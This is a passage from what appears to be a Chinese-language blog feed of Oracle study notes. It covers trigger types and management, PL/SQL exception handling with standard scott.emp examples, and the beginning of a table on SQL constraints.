<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE OR REPLACE TRIGGER upd_emp </span><br><span class="line">	BEFORE update ON scott.emp </span><br><span class="line">  	REFERENCING new AS nn  old AS oo </span><br><span class="line">	FOR EACH ROW </span><br><span class="line">	WHEN (nn.sal &gt; 2000) </span><br><span class="line">BEGIN </span><br><span class="line">	dbms_output.put_line(:nn.sal||&#39;------&#39;||:oo.sal); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="DML触发器中的谓词"><a href="#DML触发器中的谓词" class="headerlink" title="DML触发器中的谓词"></a>DML触发器中的谓词</h3><p>在DML触发器中，他们被不同的DML语句所触发，有三个布尔型函数来确定操作到底是什么：</p>
<table>
<thead>
<tr>
<th align="left">谓词</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">INSERTING</td>
<td align="left">如果触发语句是INSERT，则为TRUE，否则为FALSE</td>
</tr>
<tr>
<td align="left">UPDATING</td>
<td align="left">如果触发语句是UPDATE，则为TRUE，否则为FALSE</td>
</tr>
<tr>
<td align="left">DELETING</td>
<td align="left">如果触发语句是DELETE，则为TRUE，否则为FALSE</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例</span><br><span class="line">CREATE OR REPLACE TRIGGER check_emp </span><br><span class="line">	BEFORE update OR insert OR delete ON scott.emp </span><br><span class="line">	REFERENCING new AS nn  old AS oo </span><br><span class="line">   	FOR EACH ROW </span><br><span class="line">  	WHEN (nn.sal &gt; 2000) </span><br><span class="line">BEGIN </span><br><span class="line">  	IF INSERTING THEN </span><br><span class="line">  		dbms_output.put_line(&#39;THE OPERATION IS INSERT&#39;); </span><br><span class="line">   	ELSIF UPDATING THEN </span><br><span class="line">		dbms_output.put_line(&#39;THE OPERATION IS UPDATE&#39;); </span><br><span class="line">	ELSIF DELETING THEN </span><br><span class="line">		dbms_output.put_line(&#39;THE OPERATION IS DELETE&#39;); </span><br><span class="line">	ELSE </span><br><span class="line">		dbms_output.put_line(&#39;OTHERS OPERATION&#39;); </span><br><span class="line">	END IF; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h2 id="创建替代触发器"><a href="#创建替代触发器" class="headerlink" title="创建替代触发器"></a>创建替代触发器</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] TRIGGER trigger_name </span><br><span class="line">INSTEAD OF </span><br><span class="line">	&#123;INSERT | DELETE | UPDATE [OF column [, column …]]&#125; </span><br><span class="line">ON [schema.] view_name </span><br><span class="line">	[REFERENCING &#123;OLD [AS] old | NEW [AS] new&#125;] </span><br><span class="line">	[FOR EACH ROW ] </span><br><span class="line">trigger_body;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>INSTEAD OF<ul>
<li>使ORACLE激活触发器，而不执行触发事件。</li>
<li>与DML触发器不同，DML触发器是在DML操作之外运行的，而替代触发器则代替激发它的DML语句运行。</li>
<li>替代触发器是行一级的。只能对视图和对象视图建立INSTEAD OF触发器，而不能对表、模式和数据库建立INSTEAD OF 触发器。</li>
<li>而INSTEAD OF 触发器则为行触发器。</li>
</ul>
</li>
<li>REFERENCING<ul>
<li>说明相关名称，在行触发器的PL/SQL块和WHEN子句中可以使用相关名称参照当前的新、旧列值，默认的相关名称分别为OLD和NEW。</li>
<li>触发器的PL/SQL块中应用相关名称时，必须在它们之前加冒号(:)，但在WHEN子句中则不能加冒号。 WHEN 子句说明触发约束条件。</li>
<li>Condition 为一个逻辑表达时，其中必须包含相关名称，而不能包含查询语句，也不能调用PL/SQL 函数。</li>
</ul>
</li>
<li>WHEN<ul>
<li>指定的触发约束条件只能用在BEFORE 和AFTER 行触发器中，不能用在INSTEAD OF 行触发器和其它类型的触发器中。</li>
</ul>
</li>
<li>INSTEAD_OF<ul>
<li>用于对视图的DML触发，由于视图有可能是由多个表进行联结(join)而成，因而并非是所有的联结都是可更新的。但可以按照所需的方式执行更新</li>
</ul>
</li>
</ul>
<h3 id="替代触发器应用举例"><a href="#替代触发器应用举例" class="headerlink" title="替代触发器应用举例"></a>替代触发器应用举例</h3><p>我们可以创建INSTEAD_OF触发器来为 DELETE 操作执行所需的处理，即删除EMP表中所有基准行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE OR REPLACE TRIGGER emp_view_delete </span><br><span class="line">	INSTEAD OF DELETE ON emp_view FOR EACH ROW </span><br><span class="line">BEGIN </span><br><span class="line">	DELETE FROM emp WHERE deptno&#x3D; :old.deptno; </span><br><span class="line">END emp_view_delete; </span><br><span class="line">DELETE FROM emp_view WHERE deptno&#x3D;10;</span><br></pre></td></tr></table></figure>
<h2 id="创建系统触发器"><a href="#创建系统触发器" class="headerlink" title="创建系统触发器"></a>创建系统触发器</h2><ul>
<li>系统触发器可以在DDL或数据库系统上被触发。DDL指的是数据定义语言，如CREATE 、ALTER及DROP 等。</li>
<li>数据库系统事件包括数据库服务器的启动或关闭，用户的登录与退出、数据库服务错误等。</li>
</ul>
<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE OR REPLACE TRIGGER [sachema.] trigger_name </span><br><span class="line">	&#123;BEFORE|AFTER&#125;   </span><br><span class="line">	&#123;ddl_event_list | database_event_list&#125; </span><br><span class="line">ON &#123; DATABASE | [schema.] SCHEMA &#125; </span><br><span class="line">	[WHEN_clause]  </span><br><span class="line">trigger_body;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>ddl_event_list为一个或多个DDL事件，事件间用 OR 分开；</li>
<li>database_event_list为一个或多个数据库事件，事件间用 OR 分开；</li>
<li>系统事件触发器既可以建立在一个模式上，又可以建立在整个数据库上。<ul>
<li>当建立在模式(SCHEMA)之上时，只有模式所指定用户的DDL操作和它们所导致的错误才激活触发器, 默认时为当前用户模式。</li>
<li>当建立在数据库(DATABASE)之上时，该数据库所有用户的DDL操作和他们所导致的错误，以及数据库的启动和关闭均可激活触发器。</li>
<li>要在数据库之上建立触发器时，要求用户具有ADMINISTER DATABASE TRIGGER权限。</li>
</ul>
</li>
</ul>
<h3 id="系统触发器的种类和事件出现的时机（前或后）："><a href="#系统触发器的种类和事件出现的时机（前或后）：" class="headerlink" title="系统触发器的种类和事件出现的时机（前或后）："></a>系统触发器的种类和事件出现的时机（前或后）：</h3><table>
<thead>
<tr>
<th align="left">事件</th>
<th align="left">允许的时机</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">启动STARTUP</td>
<td align="left">之后</td>
<td align="left">实例启动时激活</td>
</tr>
<tr>
<td align="left">关闭SHUTDOWN</td>
<td align="left">之前</td>
<td align="left">实例正常关闭时激活</td>
</tr>
<tr>
<td align="left">服务器错误SERVERERROR</td>
<td align="left">之后</td>
<td align="left">只要有错误就激活</td>
</tr>
<tr>
<td align="left">登录LOGON</td>
<td align="left">之后</td>
<td align="left">成功登录后激活</td>
</tr>
<tr>
<td align="left">注销LOGOFF</td>
<td align="left">之前</td>
<td align="left">开始注销时激活</td>
</tr>
<tr>
<td align="left">创建CREATE</td>
<td align="left">之前，之后</td>
<td align="left">在创建之前或之后激活</td>
</tr>
<tr>
<td align="left">撤消DROP</td>
<td align="left">之前，之后</td>
<td align="left">在撤消之前或之后激活</td>
</tr>
<tr>
<td align="left">变更ALTER</td>
<td align="left">之前，之后</td>
<td align="left">在变更之前或之后激活</td>
</tr>
</tbody></table>
<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE OR REPLACE TRIGGER trig4_ddl </span><br><span class="line">	AFTER CREATE OR ALTER OR DROP  ON DATABASE </span><br><span class="line">DECLARE </span><br><span class="line">	Event VARCHAR2(20); Typ VARCHAR2(20); </span><br><span class="line">	Name VARCHAR2(30);  Owner VARCHAR2(30); </span><br><span class="line">BEGIN </span><br><span class="line">	--读取DDL事件属性 </span><br><span class="line">	Event :&#x3D; SYSEVENT;     --激活触发器的事件名称   </span><br><span class="line">    Typ :&#x3D; DICTIONARY_OBJ_TYPE;  --语句所操作的数据库对象类型  </span><br><span class="line">	Name :&#x3D; DICTIONARY_OBJ_NAME; --语句所操作的数据库对象名称  </span><br><span class="line">	Owner :&#x3D; DICTIONARY_OBJ_OWNER; --语句所操作的数据库对象所有者名称  </span><br><span class="line">    -- 将事件属性插入到事件日志表中 </span><br><span class="line">    INSERT INTO scott.eventlog(eventname,obj_type,obj_name,obj_owner) </span><br><span class="line">    	VALUES(event, typ, name, owner); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h2 id="重新编译触发器"><a href="#重新编译触发器" class="headerlink" title="重新编译触发器"></a>重新编译触发器</h2><ul>
<li><p>如果在触发器内调用其它函数或过程，当这些函数或过程被删除或修改后，触发器的状态将被标识为无效。当DML语句激活一个无效触发器时，ORACLE将重新编译触发器代码，如果编译时发现错误，这将导致DML语句执行失败。</p>
</li>
<li><p>在PL/SQL程序中可以调用ALTER TRIGGER语句重新编译已经创建的触发器，格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER TRIGGER [schema.] trigger_name COMPILE</span><br></pre></td></tr></table></figure>
<h2 id="删除触发器"><a href="#删除触发器" class="headerlink" title="删除触发器"></a>删除触发器</h2></li>
</ul>
<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DROP TRIGGER trigger_name;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong></p>
<ul>
<li>当删除其他用户模式中的触发器名称，需要具有DROP ANY TRIGGER系统权限</li>
<li>当删除建立在数据库上的触发器时，用户需要具有ADMINISTER DATABASE TRIGGER系统权限</li>
<li>当删除表或视图时，建立在这些对象上的触发器也随之删除</li>
</ul>
<h2 id="触发器状态"><a href="#触发器状态" class="headerlink" title="触发器状态"></a>触发器状态</h2><h3 id="有效状态-ENABLE"><a href="#有效状态-ENABLE" class="headerlink" title="有效状态(ENABLE)"></a>有效状态(ENABLE)</h3><ul>
<li>当触发事件发生时，处于有效状态的数据库触发器TRIGGER 将被触发。</li>
</ul>
<h3 id="无效状态-DISABLE"><a href="#无效状态-DISABLE" class="headerlink" title="无效状态(DISABLE)"></a>无效状态(DISABLE)</h3><ul>
<li>当触发事件发生时，处于无效状态的数据库触发器TRIGGER 将不会被触发，此时就跟没有这个数据库触发器(TRIGGER) 一样。</li>
</ul>
<h3 id="数据库TRIGGER的这两种状态可以互相转换"><a href="#数据库TRIGGER的这两种状态可以互相转换" class="headerlink" title="数据库TRIGGER的这两种状态可以互相转换"></a>数据库TRIGGER的这两种状态可以互相转换</h3><ul>
<li>ALTER TRIGGER语句一次只能改变一个触发器的状态</li>
<li>ALTER TABLE语句则一次能够改变与指定表相关的所有触发器的使用状态。</li>
</ul>
<h4 id="ALTER-TIGGER"><a href="#ALTER-TIGGER" class="headerlink" title="ALTER TIGGER"></a>ALTER TIGGER</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER TIGGER trigger_name [DISABLE | ENABLE ]; </span><br><span class="line"></span><br><span class="line">--例：</span><br><span class="line">ALTER TRIGGER emp_view_delete DISABLE;</span><br></pre></td></tr></table></figure>
<h4 id="ALTER-TABLE"><a href="#ALTER-TABLE" class="headerlink" title="ALTER TABLE"></a>ALTER TABLE</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER TABLE [schema.]table_name &#123;ENABLE|DISABLE&#125; ALL TRIGGERS;  </span><br><span class="line"></span><br><span class="line">--例：使表EMP 上的所有TRIGGER 失效： </span><br><span class="line">ALTER TABLE emp DISABLE ALL TRIGGERS;</span><br></pre></td></tr></table></figure>
<h2 id="触发器和数据字典"><a href="#触发器和数据字典" class="headerlink" title="触发器和数据字典"></a>触发器和数据字典</h2><p><strong>相关数据字典：</strong></p>
<ul>
<li>USER_TRIGGERS</li>
<li>ALL_TRIGGERS</li>
<li>DBA_TRIGGERS</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例：</span><br><span class="line">SELECT TRIGGER_NAME, TRIGGER_TYPE, TRIGGERING_EVENT, TABLE_OWNER, </span><br><span class="line">	   BASE_OBJECT_TYPE, REFERENCING_NAMES, STATUS, ACTION_TYPE </span><br><span class="line">	FROM user_triggers;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>plsql异常处理</title>
    <url>/2019/12/17/Oracle/plsql%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h1 id="plsql异常处理"><a href="#plsql异常处理" class="headerlink" title="plsql异常处理"></a>plsql异常处理</h1><h2 id="异常处理的概念"><a href="#异常处理的概念" class="headerlink" title="异常处理的概念"></a>异常处理的概念</h2><p>异常情况处理(EXCEPTION)是用来处理正常执行过程中未预料的事件,程序块的异常处理预定义的错误和自定义错误,由于PL/SQL程序块一旦产生异常而没有指出如何处理时,程序就会自动终止整个程序运行。</p>
<a id="more"></a>

<p>有三种类型的异常错误 :</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">预定义 ( Predefined )错误</td>
<td align="left">ORACLE预定义的异常情况大约有22个。对这种异常情况的处理，无需在程序中定义，由ORACLE自动将其引发</td>
</tr>
<tr>
<td align="left">非预定义 ( Predefined )错误</td>
<td align="left">即其他标准的ORACLE错误。对这种异常情况的处理，需要用户在程序中定义，然后由ORACLE自动将其引发</td>
</tr>
<tr>
<td align="left">用户定义(User_define) 错误</td>
<td align="left">程序执行过程中，出现编程人员认为的非正常情况。对这种异常情况的处理，需要用户在程序中定义，然后显式地在程序中将其引发。</td>
</tr>
</tbody></table>
<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构:"></a>结构:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXCEPTION </span><br><span class="line">   WHEN first_exception THEN  &lt;code to handle first exception &gt; </span><br><span class="line">   WHEN second_exception THEN  &lt;code to handle second exception &gt; </span><br><span class="line">   WHEN OTHERS THEN  &lt;code to handle others exception &gt; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="作用范围"><a href="#作用范围" class="headerlink" title="作用范围"></a>作用范围</h3><ul>
<li>PL/SQL的异常捕获只针对执行部分，在声明部分产生的异常是无法捕获的</li>
<li>异常处理部分本身导致的异常同样也是无法捕获的，解决方法和声明部分一样，需要在外层进行捕获。</li>
</ul>
<h3 id="异常错误"><a href="#异常错误" class="headerlink" title="异常错误"></a>异常错误</h3><p>每个异常错误都包含异常错误号（错误代码）和错误描述信息</p>
<table>
<thead>
<tr>
<th align="left">错误代码（错误代码）</th>
<th align="left">错误描述信息</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ORA-00001</td>
<td align="left">违反唯一约束条件</td>
</tr>
<tr>
<td align="left">ORA-00017</td>
<td align="left">请求会话以设置跟踪事件</td>
</tr>
<tr>
<td align="left">ORA-00018</td>
<td align="left">超出最大会话数</td>
</tr>
<tr>
<td align="left">ORA-00019</td>
<td align="left">超出最大会话许可数</td>
</tr>
<tr>
<td align="left">ORA-00020</td>
<td align="left">超出最大进程数 ()</td>
</tr>
<tr>
<td align="left">ORA-00021</td>
<td align="left">会话附属于其它某些进程；无法转换会话</td>
</tr>
<tr>
<td align="left">ORA-00022</td>
<td align="left">无效的会话 ID；访问被拒绝</td>
</tr>
<tr>
<td align="left">ORA-00023</td>
<td align="left">会话引用进程私用内存；无法分离会话</td>
</tr>
<tr>
<td align="left">ORA-00024</td>
<td align="left">单一进程模式下不允许从多个进程注册</td>
</tr>
</tbody></table>
<h3 id="预定义的异常处理"><a href="#预定义的异常处理" class="headerlink" title="预定义的异常处理"></a>预定义的异常处理</h3><table>
<thead>
<tr>
<th align="left">错误号</th>
<th align="left">异常名称</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ORA-0001</td>
<td align="left">DUP_VAL_ON_INDEX</td>
<td align="left">试图破坏一个唯一性限制</td>
</tr>
<tr>
<td align="left">ORA-0051</td>
<td align="left">TIMEOUT_ON_RESOURCE</td>
<td align="left">在等待资源时发生超时</td>
</tr>
<tr>
<td align="left">ORA-0061</td>
<td align="left">TRANSACTION_BACKED_OUT</td>
<td align="left">由于发生死锁事务被撤消</td>
</tr>
<tr>
<td align="left">ORA-1001</td>
<td align="left">INVALID_CURSOR</td>
<td align="left">试图使用一个未打开的游标</td>
</tr>
<tr>
<td align="left">ORA-1012</td>
<td align="left">NOT_LOGGED_ON</td>
<td align="left">没有连接到ORACLE</td>
</tr>
<tr>
<td align="left">ORA-1017</td>
<td align="left">LOGIN_DENIED</td>
<td align="left">无效的用户名/口令</td>
</tr>
<tr>
<td align="left">ORA-1403</td>
<td align="left">NO_DATA_FOUND</td>
<td align="left">SELECT INTO没有找到数据</td>
</tr>
<tr>
<td align="left">ORA-1422</td>
<td align="left">TOO_MANY_ROWS</td>
<td align="left">SELECT INTO 返回多行</td>
</tr>
<tr>
<td align="left">ORA-1476</td>
<td align="left">ZERO_DIVIDE</td>
<td align="left">试图被零除</td>
</tr>
<tr>
<td align="left">ORA-1722</td>
<td align="left">INVALID_NUMBER</td>
<td align="left">转换一个数字失败</td>
</tr>
<tr>
<td align="left">ORA-6500</td>
<td align="left">STORAGE_ERROR</td>
<td align="left">内存不够或内存被破坏引发的内部错误</td>
</tr>
<tr>
<td align="left">ORA-6501</td>
<td align="left">PROGRAM_ERROR</td>
<td align="left">内部错误,需重新安装数据字典视图和pl/sql包</td>
</tr>
<tr>
<td align="left">ORA-6502</td>
<td align="left">VALUE_ERROR</td>
<td align="left">赋值操作，变量长度不足，触发该异常</td>
</tr>
<tr>
<td align="left">ORA-6504</td>
<td align="left">ROWTYPE_MISMATCH</td>
<td align="left">宿主游标变量与 PL/SQL变量有不兼容行类型</td>
</tr>
<tr>
<td align="left">ORA-6511</td>
<td align="left">CURSOR_ALREADY_OPEN</td>
<td align="left">试图打开一个已打开的游标</td>
</tr>
<tr>
<td align="left">ORA-6530</td>
<td align="left">ACCESS_INTO_NULL</td>
<td align="left">试图为null 对象的属性赋值</td>
</tr>
<tr>
<td align="left">ORA-6531</td>
<td align="left">COLLECTION_IS_NULL</td>
<td align="left">试图给没有初始化的嵌套表变量或者varry变量赋值</td>
</tr>
<tr>
<td align="left">ORA-6532</td>
<td align="left">SUBSCRIPT_OUTSIDE_LIMIT</td>
<td align="left">对嵌套或varray索引使用了负数</td>
</tr>
<tr>
<td align="left">ORA-6533</td>
<td align="left">SUBSCRIPT_BEYOND_COUNT</td>
<td align="left">对嵌套或varray索引的引用大于集合中元素的个数</td>
</tr>
<tr>
<td align="left">ORA-6592</td>
<td align="left">CASE_NOT_FOUND</td>
<td align="left">当Case语句的When子句没有包含必需分支或者Else子句时，会触发该异常。</td>
</tr>
<tr>
<td align="left">ORA-30625</td>
<td align="left">SELF_IS_NULL</td>
<td align="left">试图在null实例上调用成员方法</td>
</tr>
<tr>
<td align="left">ORA-1410</td>
<td align="left">SYS_INVALID_ROWID</td>
<td align="left">试图将无效的字符串转化成ROWID</td>
</tr>
</tbody></table>
<p>对于预定义异常情况的处理，只需在PL/SQL块的异常处理部分，直接引用相应的异常情况名，并对其完成相应的异常错误处理即可。</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例： 更新指定员工工资，如工资小于1500，则加100    </span><br><span class="line"> DECLARE </span><br><span class="line">   v_empno emp.empno%TYPE :&#x3D;7900; </span><br><span class="line">   v_sal    emp.sal%TYPE; </span><br><span class="line">BEGIN </span><br><span class="line">   SELECT sal INTO v_sal FROM emp WHERE empno&#x3D;v_empno; </span><br><span class="line">   IF v_sal&lt;&#x3D;1500 THEN  </span><br><span class="line">        UPDATE emp SET sal&#x3D;sal+100 WHERE empno&#x3D;v_empno;  </span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#39;编码为&#39;||v_empno||&#39;员工工资已更新!&#39;);      </span><br><span class="line">   ELSE </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(&#39;编码为&#39;||v_empno||&#39;员工工资已经超过规定值!&#39;); </span><br><span class="line">   END IF;</span><br><span class="line">   EXCEPTION </span><br><span class="line">   WHEN NO_DATA_FOUND THEN   </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(&#39;数据库中没有编码为&#39;||v_empno||&#39;的员工&#39;); </span><br><span class="line">   WHEN TOO_MANY_ROWS THEN </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(&#39;程序运行错误!请使用游标&#39;); </span><br><span class="line">   WHEN OTHERS THEN </span><br><span class="line">     DBMS_OUTPUT.PUT_LINE(SQLCODE||’---‘||SQLERRM); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="非预定义的异常处理"><a href="#非预定义的异常处理" class="headerlink" title="非预定义的异常处理"></a>非预定义的异常处理</h3><p>预定义的异常错误大约有24个，而错误代码成千上万如ORA-00020 。 对于这类异常情况的处理，首先必须对非定义的ORACLE错误进行定义</p>
<p><strong>步骤如下：</strong></p>
<ul>
<li><p>在PL/SQL 块的声明部分定义异常情况：</p>
<p>&lt;异常情况&gt; EXCEPTION;</p>
</li>
<li><p>将其定义好的异常情况，与标准的ORACLE错误联系起来，使用EXCEPTION_INIT语句</p>
<p>PRAGMA EXCEPTION_INIT(&lt;异常情况&gt;, &lt;错误代码&gt;)；</p>
</li>
<li><p>在PL/SQL 块的异常情况处理部分对异常情况做出相应的处理。</p>
</li>
</ul>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例：删除指定部门的记录信息，以确保该部门没有员工。   </span><br><span class="line"> DECLARE </span><br><span class="line">   v_deptno dept.deptno%TYPE :&#x3D;&amp;deptno; </span><br><span class="line">   deptno_remaining EXCEPTION; </span><br><span class="line">   PRAGMA EXCEPTION_INIT(deptno_remaining, -2292); </span><br><span class="line">   &#x2F;* -2292 是违反references完整性约束的错误代码 *&#x2F; </span><br><span class="line">BEGIN </span><br><span class="line">   DELETE FROM dept WHERE deptno&#x3D;v_deptno; </span><br><span class="line">EXCEPTION </span><br><span class="line">   WHEN deptno_remaining THEN  </span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(&#39;违反数据完整性约束!&#39;); </span><br><span class="line">   WHEN OTHERS THEN </span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(SQLCODE||’---‘||SQLERRM); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="用户自定义的异常处理"><a href="#用户自定义的异常处理" class="headerlink" title="用户自定义的异常处理"></a>用户自定义的异常处理</h3><p>当与一个异常错误相关的错误出现时，就会隐含触发该异常错误。用户定义的异常错误是通过显式使用 RAISE 语句来触发。当引发一个异常错误时，控制就转向到 EXCEPTION块异常错误部分，执行错误处理代码。</p>
<p><strong>步骤如下 ：</strong></p>
<ul>
<li><p>在PL/SQL 块的声明部分定义异常情况 ：</p>
<p>&lt;异常情况&gt; EXCEPTION;</p>
</li>
<li><p>RAISE &lt;异常情况&gt;</p>
</li>
<li><p>在PL/SQL 块的异常情况处理部分对异常情况做出相应的处理。</p>
</li>
</ul>
<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例</span><br><span class="line">DECLARE </span><br><span class="line">   v_empno emp.empno%TYPE :&#x3D;&amp;empno; </span><br><span class="line">   no_result  EXCEPTION; </span><br><span class="line">BEGIN </span><br><span class="line">   UPDATE emp SET sal&#x3D;sal+100 WHERE empno&#x3D;v_empno; </span><br><span class="line">   IF SQL%NOTFOUND THEN </span><br><span class="line">      RAISE no_result; </span><br><span class="line">   END IF; </span><br><span class="line">EXCEPTION </span><br><span class="line">   WHEN no_result THEN  </span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(&#39;你的数据更新语句失败了!&#39;); </span><br><span class="line">   WHEN OTHERS THEN </span><br><span class="line">      DBMS_OUTPUT.PUT_LINE(SQLCODE||’---‘||SQLERRM); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="RAISE-APPLICATION-ERROR函数"><a href="#RAISE-APPLICATION-ERROR函数" class="headerlink" title="RAISE_APPLICATION_ERROR函数"></a>RAISE_APPLICATION_ERROR函数</h3><p>调用DBMS_STANDARD(ORACLE提供的包)包所定义的RAISE_APPLICATION_ERROR过程，可以重新定义异常错误消息，它为应用程序提供了一种与ORACLE交互的方法。 错误号的范围是-20,000到-20,999。错误信息是文本字符串，最多为2048字节。</p>
<h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例：</span><br><span class="line">declare </span><br><span class="line">      v_deptid  departments.department_id%type :&#x3D; &amp;no; </span><br><span class="line">      v_dname departments.department_name%type; </span><br><span class="line"> begin </span><br><span class="line">      select department_name into v_dname from departments </span><br><span class="line">      where department_id &#x3D; v_deptid; </span><br><span class="line">      dbms_output.put_line(v_dname); </span><br><span class="line"> exception </span><br><span class="line">      when others then </span><br><span class="line">         raise_application_error(-20001 , &#39;department&#39;||v_deptid||&#39; does not exists&#39;); </span><br><span class="line"> end;</span><br></pre></td></tr></table></figure>
<h2 id="异常错误传播"><a href="#异常错误传播" class="headerlink" title="异常错误传播"></a>异常错误传播</h2><p>由于异常错误可以在声明部分和执行部分以及异常错误部分出现，因而在不同部分引发的异常错误也不一样。</p>
<p><strong>可执行部分产生的异常：</strong></p>
<p>当一个异常错误在执行部分引发时，有下列情况：</p>
<ol>
<li>如果当前块对该异常错误设置了处理，则执行它并成功完成该块的执行，然后控制转给包含块。</li>
<li>如果没有对当前块异常错误设置定义处理器，则通过在包含块中引发它来传播异常错误。然后对该包含块执行步骤1)。</li>
</ol>
<h3 id="声明部分产生的异常："><a href="#声明部分产生的异常：" class="headerlink" title="声明部分产生的异常："></a>声明部分产生的异常：</h3><p>如果在声明部分引起 异常 情况，即在声明部分出现错误，那么该错误就能影响到其它的块</p>
<h4 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--例1：</span><br><span class="line">DECLARE </span><br><span class="line">	Abc number(3):&#x3D;’abc’; </span><br><span class="line">	--其它语句 </span><br><span class="line">BEGIN </span><br><span class="line">	--其它语句 </span><br><span class="line">	EXCEPTION </span><br><span class="line">	WHEN OTHERS THEN  </span><br><span class="line">	--其它语句 </span><br><span class="line">END; </span><br><span class="line">&#x2F;*</span><br><span class="line">由于Abc number(3)&#x3D;’abc’; 出错，尽管在EXCEPTION中说明了WHEN OTHERS THEN语句，但WHEN OTHERS THEN也不会被执行。  </span><br><span class="line">*&#x2F;</span><br><span class="line">--例2：</span><br><span class="line">BEGIN </span><br><span class="line"> DECLARE </span><br><span class="line">     Abc number(3):&#x3D;’abc’; </span><br><span class="line">     --其它语句 </span><br><span class="line">    BEGIN </span><br><span class="line">     --其它语句 </span><br><span class="line">    EXCEPTION </span><br><span class="line">     WHEN OTHERS THEN  </span><br><span class="line">     --其它语句 </span><br><span class="line">  	END; </span><br><span class="line"> EXCEPTION </span><br><span class="line"> WHEN OTHERS THEN  </span><br><span class="line"> --其它语句 </span><br><span class="line">END; </span><br><span class="line">&#x2F;*</span><br><span class="line">在该错误语句块的外部有一个异常错误，则该错误能被抓住</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="异常处理的SQLCode和SQL-Errm"><a href="#异常处理的SQLCode和SQL-Errm" class="headerlink" title="异常处理的SQLCode和SQL Errm"></a>异常处理的SQLCode和SQL Errm</h2><p>**注意： **</p>
<ul>
<li>某给定异常（如自定义）只能在异常处理部分的处理一次。如果有多个异常处理器（多次when），则会抛出PLS-00483异常。</li>
<li>SQLCODE返回当前的错误代码，SQLERRM返回当前的错误信息。对于用户自定义异常SQLCODE返回值为‘1’，SQLERRM返回值为‘User-defined Exception’</li>
<li>Oracle错误信息的最大长度是512字节</li>
<li>SQLCODE和SQLERRM的值先赋给本地变量，不能直接用于SQL语句</li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>sql约束</title>
    <url>/2019/12/17/Oracle/sql%E7%BA%A6%E6%9D%9F/</url>
    <content><![CDATA[<h1 id="sql约束"><a href="#sql约束" class="headerlink" title="sql约束"></a>sql约束</h1><a id="more"></a>

<table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">关键字</th>
<th align="left">含义</th>
<th align="left">所属级别</th>
</tr>
</thead>
<tbody><tr>
<td align="left">默认值约束</td>
<td align="left">DEFAULT</td>
<td align="left">可以为某一列指定默认值。当用户插入或修改元组时，在没有为该列赋值的情况下可以用指定的默认值填入该列。</td>
<td align="left">列级约束</td>
</tr>
<tr>
<td align="left">非空值约束</td>
<td align="left">NOT NULL</td>
